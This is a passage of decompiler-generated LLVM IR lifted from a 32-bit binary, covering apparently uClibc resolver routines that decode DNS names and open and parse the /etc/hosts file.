  %v3_8066e17 = add i32 %v0_8066e17, %v4_8066e05
  %v0_8066e19 = load i32, i32* @esi, align 4
  %v2_8066e19 = sub i32 %v0_8066e19, %v3_8066e17
  %v1_8066e1f = add i32 %v2_8066e19, -10
  %v10_8066e1f = icmp slt i32 %v1_8066e1f, 0
  store i32 %v1_8066e1f, i32* @esi, align 4
  %v1_8066e26 = icmp eq i1 %v10_8066e1f, false
  br i1 %v1_8066e26, label %dec_label_pc_8066e2f, label %dec_label_pc_8066e28

dec_label_pc_8066e28:                             ; preds = %dec_label_pc_8066e17
  br label %dec_label_pc_8066ec0

dec_label_pc_8066e2f:                             ; preds = %dec_label_pc_8066e17
  %v6_8066e36 = add i32 %v3_8066e17, %tmp4
  store i32 %v6_8066e36, i32* @ebx, align 4
  %v1_8066e42 = bitcast i32* %stack_var_-272 to i8*
  %v2_8066e42 = call i32 @__GI_strdup(i8* %v1_8066e42)
  %v1_8066e47 = load i32, i32* @ebp, align 4
  %v2_8066e47 = inttoptr i32 %v1_8066e47 to i32*
  store i32 %v2_8066e42, i32* %v2_8066e47, align 4
  %v0_8066e4a = load i32, i32* @ebx, align 4
  %v1_8066e4a = add i32 %v0_8066e4a, 4
  store i32 %v1_8066e4a, i32* %esi.global-to-local, align 4
  %v1_8066e4d = inttoptr i32 %v0_8066e4a to i8*
  %v2_8066e4d = load i8, i8* %v1_8066e4d, align 1
  %v3_8066e4d = zext i8 %v2_8066e4d to i32
  %v1_8066e50 = add i32 %v0_8066e4a, 1
  %v2_8066e50 = inttoptr i32 %v1_8066e50 to i8*
  %v3_8066e50 = load i8, i8* %v2_8066e50, align 1
  %v4_8066e50 = zext i8 %v3_8066e50 to i32
  %v2_8066e54 = mul nuw nsw i32 %v3_8066e4d, 256
  %v2_8066e57 = or i32 %v4_8066e50, %v2_8066e54
  %v1_8066e59 = load i32, i32* @ebp, align 4
  %v2_8066e59 = add i32 %v1_8066e59, 4
  %v3_8066e59 = inttoptr i32 %v2_8066e59 to i32*
  store i32 %v2_8066e57, i32* %v3_8066e59, align 4
  %v0_8066e5c = load i32, i32* @ebx, align 4
  %v1_8066e5c = add i32 %v0_8066e5c, 2
  %v2_8066e5c = inttoptr i32 %v1_8066e5c to i8*
  %v3_8066e5c = load i8, i8* %v2_8066e5c, align 1
  %v4_8066e5c = zext i8 %v3_8066e5c to i32
  %v1_8066e60 = add i32 %v0_8066e5c, 3
  %v2_8066e60 = inttoptr i32 %v1_8066e60 to i8*
  %v3_8066e60 = load i8, i8* %v2_8066e60, align 1
  %v4_8066e60 = zext i8 %v3_8066e60 to i32
  %v2_8066e64 = mul nuw nsw i32 %v4_8066e5c, 256
  %v2_8066e67 = or i32 %v4_8066e60, %v2_8066e64
  %v1_8066e69 = load i32, i32* @ebp, align 4
  %v2_8066e69 = add i32 %v1_8066e69, 8
  %v3_8066e69 = inttoptr i32 %v2_8066e69 to i32*
  store i32 %v2_8066e67, i32* %v3_8066e69, align 4
  %v0_8066e6c = load i32, i32* @ebx, align 4
  %v1_8066e6c = add i32 %v0_8066e6c, 4
  %v2_8066e6c = inttoptr i32 %v1_8066e6c to i8*
  %v3_8066e6c = load i8, i8* %v2_8066e6c, align 1
  %v4_8066e6c = zext i8 %v3_8066e6c to i32
  %v0_8066e70 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066e70 = add i32 %v0_8066e70, 1
  %v2_8066e70 = inttoptr i32 %v1_8066e70 to i8*
  %v3_8066e70 = load i8, i8* %v2_8066e70, align 1
  %v4_8066e70 = zext i8 %v3_8066e70 to i32
  %v2_8066e74 = mul nuw i32 %v4_8066e6c, 16777216
  %v2_8066e77 = mul nuw nsw i32 %v4_8066e70, 65536
  %v1_8066e7a = add i32 %v0_8066e70, 2
  %v2_8066e7a = inttoptr i32 %v1_8066e7a to i8*
  %v3_8066e7a = load i8, i8* %v2_8066e7a, align 1
  %v4_8066e7a = zext i8 %v3_8066e7a to i32
  %v2_8066e7e = mul nuw nsw i32 %v4_8066e7a, 256
  %v2_8066e81 = or i32 %v2_8066e77, %v2_8066e74
  %v1_8066e83 = add i32 %v0_8066e70, 3
  %v2_8066e83 = inttoptr i32 %v1_8066e83 to i8*
  %v3_8066e83 = load i8, i8* %v2_8066e83, align 1
  %v4_8066e83 = zext i8 %v3_8066e83 to i32
  %v2_8066e87 = or i32 %v4_8066e83, %v2_8066e81
  %v2_8066e89 = or i32 %v2_8066e87, %v2_8066e7e
  store i32 %v2_8066e89, i32* @ecx, align 4
  %v1_8066e8b = load i32, i32* @ebp, align 4
  %v2_8066e8b = add i32 %v1_8066e8b, 12
  %v3_8066e8b = inttoptr i32 %v2_8066e8b to i32*
  store i32 %v2_8066e89, i32* %v3_8066e8b, align 4
  %v0_8066e8e = load i32, i32* @ebx, align 4
  %v1_8066e8e = add i32 %v0_8066e8e, 8
  %v2_8066e8e = inttoptr i32 %v1_8066e8e to i8*
  %v3_8066e8e = load i8, i8* %v2_8066e8e, align 1
  %v4_8066e8e = zext i8 %v3_8066e8e to i32
  %v1_8066e92 = add i32 %v0_8066e8e, 9
  %v2_8066e92 = inttoptr i32 %v1_8066e92 to i8*
  %v3_8066e92 = load i8, i8* %v2_8066e92, align 1
  %v4_8066e92 = zext i8 %v3_8066e92 to i32
  %v2_8066e96 = mul nuw nsw i32 %v4_8066e8e, 256
  %v1_8066e99 = add i32 %v0_8066e8e, 10
  %v2_8066e9c = or i32 %v4_8066e92, %v2_8066e96
  store i32 %v2_8066e9c, i32* @edx, align 4
  %v1_8066e9e = load i32, i32* @ebp, align 4
  %v2_8066e9e = add i32 %v1_8066e9e, 20
  %v3_8066e9e = inttoptr i32 %v2_8066e9e to i32*
  store i32 %v1_8066e99, i32* %v3_8066e9e, align 4
  %v0_8066ea1 = load i32, i32* @edx, align 4
  %v1_8066ea1 = load i32, i32* @ebp, align 4
  %v2_8066ea1 = add i32 %v1_8066ea1, 16
  %v3_8066ea1 = inttoptr i32 %v2_8066ea1 to i32*
  store i32 %v0_8066ea1, i32* %v3_8066ea1, align 4
  %v1_8066eab = add i32 %v3_8066e17, 10
  %v1_8066eae = load i32, i32* @ebp, align 4
  %v2_8066eae = add i32 %v1_8066eae, 24
  %v3_8066eae = inttoptr i32 %v2_8066eae to i32*
  store i32 %v1_8066eab, i32* %v3_8066eae, align 4
  %v4_8066eb1 = load i32, i32* @edx, align 4
  %v5_8066eb5 = icmp slt i32 %v1_8066e1f, %v4_8066eb1
  br i1 %v5_8066eb5, label %dec_label_pc_8066eb7, label %dec_label_pc_8066ebc

dec_label_pc_8066eb7:                             ; preds = %dec_label_pc_8066e2f
  br label %dec_label_pc_8066ec0

dec_label_pc_8066ebc:                             ; preds = %dec_label_pc_8066e2f
  %v1_8066ebc = load i32, i32* @edi, align 4
  %v2_8066ebc = add i32 %v4_8066eb1, 10
  %v3_8066ebc = add i32 %v2_8066ebc, %v1_8066ebc
  br label %dec_label_pc_8066ec0

dec_label_pc_8066ec0:                             ; preds = %entry, %dec_label_pc_8066eb7, %dec_label_pc_8066e28, %dec_label_pc_8066ebc
  %v0_8066ec6 = phi i32 [ %v4_8066e05, %entry ], [ -1, %dec_label_pc_8066eb7 ], [ %v1_8066e1f, %dec_label_pc_8066e28 ], [ %v3_8066ebc, %dec_label_pc_8066ebc ]
  %v2_8066ec8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066ec8, i32* @ebx, align 4
  store i32 %v0_8066dd6, i32* @esi, align 4
  store i32 %v0_8066dd5, i32* @edi, align 4
  store i32 %v0_8066dd4, i32* @ebp, align 4
  ret i32 %v0_8066ec6

; uselistorder directives
  uselistorder i32 %v1_8066e1f, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8066e17, { 1, 0, 2 }
  uselistorder i32 %v4_8066e05, { 1, 0, 2, 3 }
  uselistorder i32 24, { 80, 81, 12, 4, 13, 0, 89, 98, 99, 1, 48, 49, 50, 51, 52, 5, 36, 88, 20, 82, 83, 84, 90, 64, 65, 53, 54, 28, 74, 75, 55, 87, 56, 100, 62, 3, 57, 2, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 85, 91, 92, 93, 94, 95, 96, 97, 101, 9, 86, 66, 67, 68, 58, 59, 60, 61, 103, 102, 63, 21, 29, 30, 31, 32, 33, 34, 35, 6, 69, 70, 71, 72, 14, 73, 18, 19, 17, 10, 15, 76, 23, 7, 8, 11, 22, 77, 24, 78, 25, 27, 26, 16, 79 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 15, 18, 16, 19, 17, 21, 20, 22, 24, 23, 26, 25, 28, 29, 27 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 3, 4, 0, 1 }
  uselistorder i32 -10, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__decode_dotted, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8066ec0, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8066edd = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_806e81e.910 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  store i32 %v3_8066edd, i32* @eax, align 4
  %v1_8066ee5 = icmp eq i32 %v3_8066edd, 0
  %v1_8066ee7 = icmp eq i1 %v1_8066ee5, false
  br i1 %v1_8066ee7, label %dec_label_pc_8066efd, label %dec_label_pc_8066ee9

dec_label_pc_8066ee9:                             ; preds = %entry
  %v3_8066ef5 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_806e829.911 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  br label %dec_label_pc_8066efd

dec_label_pc_8066efd:                             ; preds = %entry, %dec_label_pc_8066ee9
  %v0_8066f00 = phi i32 [ %v3_8066edd, %entry ], [ %v3_8066ef5, %dec_label_pc_8066ee9 ]
  ret i32 %v0_8066f00

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 4, 3, 2, 1, 15, 14, 13, 12, 11, 5, 10, 9, 8, 7, 6, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_806e751.873 to i32), { 0, 1, 2, 6, 3, 7, 4, 5 }
  uselistorder label %dec_label_pc_8066efd, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8066f01 = load i32, i32* @ebp, align 4
  %v0_8066f02 = load i32, i32* @edi, align 4
  %v0_8066f03 = load i32, i32* @esi, align 4
  %v0_8066f04 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8066f12 = sub i32 0, %arg6
  %v1_8066f14 = urem i32 %v1_8066f12, 4
  %v2_8066f14 = icmp eq i32 %v1_8066f14, 0
  store i32 %v1_8066f14, i32* %eax.global-to-local, align 4
  br i1 %v2_8066f14, label %dec_label_pc_8066f25, label %dec_label_pc_8066f19

dec_label_pc_8066f19:                             ; preds = %entry
  %v2_8066f19 = sub i32 %arg7, %v1_8066f14
  %v7_8066f19 = icmp ugt i32 %v1_8066f14, %arg7
  br i1 %v7_8066f19, label %dec_label_pc_80671c9, label %dec_label_pc_8066f21

dec_label_pc_8066f21:                             ; preds = %dec_label_pc_8066f19
  %v2_8066f21 = add i32 %v1_8066f14, %arg6
  store i32 %v2_8066f21, i32* @ebx, align 4
  store i32 %v2_8066f19, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066f25

dec_label_pc_8066f25:                             ; preds = %entry, %dec_label_pc_8066f21
  %v0_8066f2e = phi i32 [ %arg6, %entry ], [ %v2_8066f21, %dec_label_pc_8066f21 ]
  %v0_8066f31 = phi i32 [ %arg7, %entry ], [ %v2_8066f19, %dec_label_pc_8066f21 ]
  %tmp154 = icmp ult i32 %v0_8066f31, 32
  br i1 %tmp154, label %dec_label_pc_80671c9, label %dec_label_pc_8066f2e

dec_label_pc_8066f2e:                             ; preds = %dec_label_pc_8066f25
  %v1_8066f2e = add i32 %v0_8066f2e, 32
  store i32 %v1_8066f2e, i32* %eax.global-to-local, align 4
  %v1_8066f31 = add i32 %v0_8066f31, -32
  store i32 %v1_8066f31, i32* @ebp, align 4
  %v5_8066f34 = inttoptr i32 %v1_8066f2e to i8*
  %v12_8066f38 = icmp eq i32 %arg4, 1
  br i1 %v12_8066f38, label %dec_label_pc_806705a, label %dec_label_pc_8066f43

dec_label_pc_8066f43:                             ; preds = %dec_label_pc_8066f2e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8066f4a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8066f4a, align 4
  %tmp155 = icmp ult i32 %v1_8066f31, 4
  br i1 %tmp155, label %dec_label_pc_80671c9, label %dec_label_pc_8066f56

dec_label_pc_8066f56:                             ; preds = %dec_label_pc_8066f43
  %v0_8066f56 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066f56 = add i32 %v0_8066f56, -36
  store i32 %v1_8066f56, i32* %eax.global-to-local, align 4
  %tmp156 = icmp ult i32 %v1_8066f56, 8
  br i1 %tmp156, label %dec_label_pc_80671c9, label %dec_label_pc_8066f62

dec_label_pc_8066f62:                             ; preds = %dec_label_pc_8066f56
  %v0_8066f62 = load i32, i32* @ebp, align 4
  %tmp157 = icmp ult i32 %v0_8066f62, 16
  br i1 %tmp157, label %dec_label_pc_80671c9, label %dec_label_pc_8066f6b

dec_label_pc_8066f6b:                             ; preds = %dec_label_pc_8066f62
  %v1_8066f6b = add i32 %v0_8066f56, -48
  store i32 %v1_8066f6b, i32* %eax.global-to-local, align 4
  %tmp158 = icmp ult i32 %v1_8066f6b, 8
  br i1 %tmp158, label %dec_label_pc_80671c9, label %dec_label_pc_8066f77

dec_label_pc_8066f77:                             ; preds = %dec_label_pc_8066f6b
  %v0_8066f77 = load i32, i32* @ebx, align 4
  %v1_8066f77 = add i32 %v0_8066f77, 48
  %v1_8066f7a = add i32 %v0_8066f56, -44
  store i32 %v1_8066f7a, i32* @ebp, align 4
  %v1_8066f81 = add i32 %v0_8066f56, -56
  store i32 %v1_8066f81, i32* @eax, align 4
  %v1_8066f84 = add i32 %v0_8066f77, 36
  store i32 %v1_8066f84, i32* @edi, align 4
  %v7_8066f87 = icmp ult i32 %v1_8066f81, %v1_8066f7a
  br i1 %v7_8066f87, label %dec_label_pc_8066f90, label %dec_label_pc_8066f8b

dec_label_pc_8066f8b:                             ; preds = %dec_label_pc_8066f77
  %v1_8066f8b = add i32 %v0_8066f77, 44
  store i32 %v1_8066f8b, i32* @esi, align 4
  br label %dec_label_pc_8066f95

dec_label_pc_8066f90:                             ; preds = %dec_label_pc_8066f77
  %v1_8066f90 = add i32 %v0_8066f77, 56
  store i32 %v1_8066f90, i32* @esi, align 4
  store i32 %v1_8066f81, i32* @ebp, align 4
  br label %dec_label_pc_8066f95

dec_label_pc_8066f95:                             ; preds = %dec_label_pc_8066f8b, %dec_label_pc_8066f90
  %v0_8066f95 = phi i32 [ %v1_8066f7a, %dec_label_pc_8066f8b ], [ %v1_8066f81, %dec_label_pc_8066f90 ]
  %tmp159 = icmp ult i32 %v0_8066f95, 80
  br i1 %tmp159, label %dec_label_pc_80671c9, label %dec_label_pc_8066f9e

dec_label_pc_8066f9e:                             ; preds = %dec_label_pc_8066f95
  %v0_8066f9e = call i32 @__open_etc_hosts()
  store i32 %v0_8066f9e, i32* %eax.global-to-local, align 4
  %v1_8066fa7 = icmp eq i32 %v0_8066f9e, 0
  br i1 %v1_8066fa7, label %dec_label_pc_8066fcb, label %dec_label_pc_8066fab

dec_label_pc_8066fab:                             ; preds = %dec_label_pc_8066f9e
  store i32 %v1_8066f2e, i32* %edx.global-to-local, align 4
  store i32 %v1_8066f77, i32* %eax.global-to-local, align 4
  store i8* %v5_8066f34, i8** %stack_var_-44, align 4
  %v0_8066fb6 = load i32, i32* @edi, align 4
  %v0_8066fc2 = load i32, i32* @esi, align 4
  %v5_8066fc2 = inttoptr i32 %v0_8066fc2 to i8*
  br label %dec_label_pc_8067079

dec_label_pc_8066fcb:                             ; preds = %dec_label_pc_8066f9e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8066fcf = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8066fcf, align 4
  %v1_8066fd5 = call i32 @__errno_location(i32 0)
  store i32 %v1_8066fd5, i32* %eax.global-to-local, align 4
  %v1_8066fda = inttoptr i32 %v1_8066fd5 to i32*
  %v2_8066fda = load i32, i32* %v1_8066fda, align 4
  store i32 %v2_8066fda, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80671c9

dec_label_pc_8066fe5:                             ; preds = %dec_label_pc_806714c
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8066fe9 = load i8*, i8** %stack_var_-44, align 4
  %v3_8066fe9 = ptrtoint i8* %v2_8066fe9 to i32
  %v2_8066fec = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8066fe9, i32* %v2_8066fec, align 4
  %v0_8066fee = load i32, i32* %eax.global-to-local, align 4
  %v1_8066fee = add i32 %v0_8066fee, 4
  %v2_8066fee = inttoptr i32 %v1_8066fee to i32*
  store i32 0, i32* %v2_8066fee, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8066ff9 = load i32, i32* @ebx, align 4
  %v1_8066ff9 = add i32 %v0_8066ff9, 4
  %v2_8066ff9 = inttoptr i32 %v1_8066ff9 to i32*
  %v3_8066ff9 = load i32, i32* %v2_8066ff9, align 4
  store i32 %v3_8066ff9, i32* %eax.global-to-local, align 4
  store i32 %v3_8066ff9, i32* %arg5, align 4
  %v0_8066ffe = load i32, i32* %edx.global-to-local, align 4
  %v1_8066ffe = add i32 %v0_8066ffe, 8
  %v2_8066ffe = inttoptr i32 %v1_8066ffe to i32*
  store i32 2, i32* %v2_8066ffe, align 4
  %v0_8067005 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067005 = add i32 %v0_8067005, 12
  %v2_8067005 = inttoptr i32 %v1_8067005 to i32*
  store i32 4, i32* %v2_8067005, align 4
  br label %dec_label_pc_806703e

dec_label_pc_8067012:                             ; preds = %dec_label_pc_806716e
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_806701a = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_806701a, align 4
  %v0_806701c = load i32, i32* %edx.global-to-local, align 4
  %v1_806701c = add i32 %v0_806701c, 4
  %v2_806701c = inttoptr i32 %v1_806701c to i32*
  store i32 0, i32* %v2_806701c, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8067027 = load i32, i32* @ebx, align 4
  %v1_8067027 = add i32 %v0_8067027, 4
  %v2_8067027 = inttoptr i32 %v1_8067027 to i32*
  %v3_8067027 = load i32, i32* %v2_8067027, align 4
  store i32 %v3_8067027, i32* %eax.global-to-local, align 4
  store i32 %v3_8067027, i32* %arg5, align 4
  %v0_806702c = load i32, i32* %edx.global-to-local, align 4
  %v1_806702c = add i32 %v0_806702c, 8
  %v2_806702c = inttoptr i32 %v1_806702c to i32*
  store i32 10, i32* %v2_806702c, align 4
  %v0_8067033 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067033 = add i32 %v0_8067033, 12
  %v2_8067033 = inttoptr i32 %v1_8067033 to i32*
  store i32 16, i32* %v2_8067033, align 4
  br label %dec_label_pc_806703e

dec_label_pc_806703e:                             ; preds = %dec_label_pc_8066fe5, %dec_label_pc_8067012
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8066fe5 ], [ %stack_var_-32.0, %dec_label_pc_8067012 ]
  %v1_806703e = load i32, i32* %edx.global-to-local, align 4
  %v2_806703e = add i32 %v1_806703e, 16
  %v3_806703e = inttoptr i32 %v2_806703e to i32*
  store i32 %storemerge, i32* %v3_806703e, align 4
  %v0_8067041 = load i32, i32* @ebx, align 4
  %v1_8067041 = add i32 %v0_8067041, 8
  %v1_8067044 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067044 = add i32 %v1_8067044, 4
  %v3_8067044 = inttoptr i32 %v2_8067044 to i32*
  store i32 %v1_8067041, i32* %v3_8067044, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_806704b = load i32, i32* %edx.global-to-local, align 4
  %v2_806704b = inttoptr i32 %arg8 to i32*
  store i32 %v0_806704b, i32* %v2_806704b, align 4
  br label %dec_label_pc_80671a9

dec_label_pc_806705a:                             ; preds = %dec_label_pc_8066f2e
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8067079

dec_label_pc_8067079:                             ; preds = %dec_label_pc_8066fab, %dec_label_pc_806705a
  %v1_806707d.pre-phi = phi i32* [ %v1_8066f4a, %dec_label_pc_8066fab ], [ %.pre, %dec_label_pc_806705a ]
  %stack_var_-32.0 = phi i32 [ %v1_8066f77, %dec_label_pc_8066fab ], [ 0, %dec_label_pc_806705a ]
  %stack_var_-36.0 = phi i32 [ %v1_8066f2e, %dec_label_pc_8066fab ], [ 0, %dec_label_pc_806705a ]
  %stack_var_-40.0 = phi i32 [ %v0_8066fb6, %dec_label_pc_8066fab ], [ 0, %dec_label_pc_806705a ]
  %stack_var_4.0 = phi i32 [ %v0_8066f9e, %dec_label_pc_8066fab ], [ %arg1, %dec_label_pc_806705a ]
  %stack_var_-20.0 = phi i8* [ %v5_8066fc2, %dec_label_pc_8066fab ], [ %v5_8066f34, %dec_label_pc_806705a ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_806707d.pre-phi, align 4
  %v4_8067195 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8067132 = inttoptr i32 %arg2 to i8*
  %v0_806718f125132 = load i32, i32* @edx, align 4
  %v3_8067199126133 = call i32 @fgets(i32 %v4_8067195, i32 %stack_var_4.0, i32 %v0_806718f125132)
  store i32 %v3_8067199126133, i32* %eax.global-to-local, align 4
  %v1_80671a1127134 = icmp eq i32 %v3_8067199126133, 0
  %v1_80671a3128135 = icmp eq i1 %v1_80671a1127134, false
  br i1 %v1_80671a3128135, label %dec_label_pc_8067090.lr.ph.lr.ph, label %dec_label_pc_80671a9

dec_label_pc_8067090.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8067079
  %v12_8067167 = icmp eq i32 %arg3, 10
  %v12_8067145 = icmp eq i32 %arg3, 2
  %v12_806710c = icmp eq i32 %arg4, 2
  %v1_8067111 = icmp eq i1 %v12_806710c, false
  %v1_806714a = icmp eq i1 %v12_8067145, false
  %v1_806716c = icmp eq i1 %v12_8067167, false
  br label %dec_label_pc_8067090.lr.ph

dec_label_pc_8067090.lr.ph:                       ; preds = %dec_label_pc_8067090.lr.ph.lr.ph, %dec_label_pc_806718f.outer.backedge
  %stack_var_-28.0.ph136 = phi i32 [ 1, %dec_label_pc_8067090.lr.ph.lr.ph ], [ 2, %dec_label_pc_806718f.outer.backedge ]
  br label %dec_label_pc_8067090

dec_label_pc_8067090:                             ; preds = %dec_label_pc_8067090.lr.ph, %dec_label_pc_806718f.backedge
  %v3_8067098 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8067098, i32* @eax, align 4
  %v1_80670a0 = icmp eq i32 %v3_8067098, 0
  br i1 %v1_80670a0, label %dec_label_pc_80670a7, label %dec_label_pc_80670a4

dec_label_pc_80670a4:                             ; preds = %dec_label_pc_8067090
  %v1_80670a4 = inttoptr i32 %v3_8067098 to i8*
  store i8 0, i8* %v1_80670a4, align 1
  br label %dec_label_pc_80670a7

dec_label_pc_80670a7:                             ; preds = %dec_label_pc_8067090, %dec_label_pc_80670a4
  store i32 %v4_8067195, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80670e732 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80670e733 = icmp eq i8 %v2_80670e732, 0
  %v1_80670ea39 = icmp eq i1 %v3_80670e733, false
  br i1 %v1_80670ea39, label %dec_label_pc_80670b3.preheader.preheader, label %dec_label_pc_80670ec

dec_label_pc_80670b3.preheader.preheader:         ; preds = %dec_label_pc_80670a7
  %v4_80670b397.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80670b3.preheader

dec_label_pc_80670af:                             ; preds = %dec_label_pc_80670b9
  store i8 0, i8* %v1_80670b3102, align 1
  %v0_80670b2 = load i32, i32* @ecx, align 4
  %v1_80670b2 = add i32 %v0_80670b2, 1
  store i32 %v1_80670b2, i32* @ecx, align 4
  %v1_80670b3 = inttoptr i32 %v1_80670b2 to i8*
  %v2_80670b3 = load i8, i8* %v1_80670b3, align 1
  %v3_80670b3 = zext i8 %v2_80670b3 to i32
  %v4_80670b3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80670b3 = and i32 %v4_80670b3, -256
  %v6_80670b3 = or i32 %v5_80670b3, %v3_80670b3
  store i32 %v6_80670b3, i32* @eax, align 4
  %v4_80670b5 = icmp eq i8 %v2_80670b3, 0
  br i1 %v4_80670b5, label %dec_label_pc_80670b3.dec_label_pc_80670ec.loopexit_crit_edge, label %dec_label_pc_80670b9

dec_label_pc_80670b9:                             ; preds = %dec_label_pc_80670b3.preheader, %dec_label_pc_80670af
  %v2_80670b3103 = phi i8 [ %v2_80670b3, %dec_label_pc_80670af ], [ %v2_80670b395, %dec_label_pc_80670b3.preheader ]
  %v1_80670b3102 = phi i8* [ %v1_80670b3, %dec_label_pc_80670af ], [ %v1_80670b394, %dec_label_pc_80670b3.preheader ]
  %v0_80670af101 = phi i32 [ %v1_80670b2, %dec_label_pc_80670af ], [ %v0_80670b347, %dec_label_pc_80670b3.preheader ]
  %v2_80670b9 = sext i8 %v2_80670b3103 to i32
  store i32 %v2_80670b9, i32* @edx, align 4
  %v0_80670bc = load i32, i32* @global_var_8073fcc, align 4
  store i32 %v0_80670bc, i32* %eax.global-to-local, align 4
  %v2_80670c1 = mul nsw i32 %v2_80670b9, 2
  %v3_80670c1 = add i32 %v0_80670bc, %v2_80670c1
  %v4_80670c1 = inttoptr i32 %v3_80670c1 to i8*
  %v5_80670c1 = load i8, i8* %v4_80670c1, align 1
  %v6_80670c1 = and i8 %v5_80670c1, 32
  %v7_80670c1 = icmp eq i8 %v6_80670c1, 0
  %v1_80670c5 = icmp eq i1 %v7_80670c1, false
  br i1 %v1_80670c5, label %dec_label_pc_80670af, label %dec_label_pc_80670c7

dec_label_pc_80670c7:                             ; preds = %dec_label_pc_80670b9
  %v0_80670c7 = load i32, i32* @edi, align 4
  %v1_80670c7 = add i32 %v0_80670c7, -6
  %v6_80670c7 = sub i32 5, %v0_80670c7
  %v7_80670c7 = and i32 %v6_80670c7, %v0_80670c7
  %v8_80670c7 = icmp slt i32 %v7_80670c7, 0
  %v9_80670c7 = icmp eq i32 %v1_80670c7, 0
  %v10_80670c7 = icmp slt i32 %v1_80670c7, 0
  %v3_80670ca = icmp eq i1 %v10_80670c7, %v8_80670c7
  %v4_80670ca = icmp eq i1 %v9_80670c7, false
  %v5_80670ca = and i1 %v4_80670ca, %v3_80670ca
  br i1 %v5_80670ca, label %dec_label_pc_80670d3.preheader, label %dec_label_pc_80670cc

dec_label_pc_80670cc:                             ; preds = %dec_label_pc_80670c7
  %v1_80670cc = load i32, i32* @ebx, align 4
  %v3_80670cc = mul i32 %v0_80670c7, 4
  %v4_80670cc = add i32 %v1_80670cc, %v3_80670cc
  %v5_80670cc = inttoptr i32 %v4_80670cc to i32*
  store i32 %v0_80670af101, i32* %v5_80670cc, align 4
  %v0_80670cf = load i32, i32* @edi, align 4
  %v1_80670cf = add i32 %v0_80670cf, 1
  store i32 %v1_80670cf, i32* @edi, align 4
  %v0_80670d3.pre.pre = load i32, i32* @ecx, align 4
  %v4_80670d3.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80670d3.preheader

dec_label_pc_80670d3.preheader:                   ; preds = %dec_label_pc_80670cc, %dec_label_pc_80670c7
  %v4_80670d3.pre = phi i32 [ %v4_80670d3.pre.pre, %dec_label_pc_80670cc ], [ %v0_80670bc, %dec_label_pc_80670c7 ]
  %v0_80670d3.pre = phi i32 [ %v0_80670d3.pre.pre, %dec_label_pc_80670cc ], [ %v0_80670af101, %dec_label_pc_80670c7 ]
  %v1_80670ec52 = phi i32 [ %v1_80670cf, %dec_label_pc_80670cc ], [ %v0_80670c7, %dec_label_pc_80670c7 ]
  %v1_80670d3104 = inttoptr i32 %v0_80670d3.pre to i8*
  %v2_80670d3105 = load i8, i8* %v1_80670d3104, align 1
  %v3_80670d3106 = zext i8 %v2_80670d3105 to i32
  %v5_80670d3107 = and i32 %v4_80670d3.pre, -256
  %v6_80670d3108 = or i32 %v3_80670d3106, %v5_80670d3107
  store i32 %v6_80670d3108, i32* @eax, align 4
  %v4_80670d5109 = icmp eq i8 %v2_80670d3105, 0
  br i1 %v4_80670d5109, label %dec_label_pc_80670e7.loopexit, label %dec_label_pc_80670d9.lr.ph

dec_label_pc_80670d9.lr.ph:                       ; preds = %dec_label_pc_80670d3.preheader
  %v0_80670dc.pre = load i32, i32* @global_var_8073fcc, align 4
  br label %dec_label_pc_80670d9

dec_label_pc_80670d2:                             ; preds = %dec_label_pc_80670d9
